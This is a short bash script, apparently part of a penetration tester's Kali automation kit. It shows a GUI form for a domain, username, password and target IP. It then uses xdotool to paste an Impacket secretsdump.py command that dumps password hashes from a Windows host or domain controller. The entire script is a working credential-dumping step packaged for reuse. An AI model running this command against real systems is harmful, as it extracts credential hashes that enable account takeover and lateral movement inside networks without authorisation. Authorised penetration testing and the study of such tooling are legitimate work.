#!/bin/bash

: '
Impacket: use secretsdump to dump hashes
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Domain" "Username" "Password" "IP"

DOMAIN=${form_data["Domain"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}
IP=${form_data["IP"]}

paste_command "secretsdump.py ${DOMAIN}/${USERNAME}:${PASSWORD}@${IP}"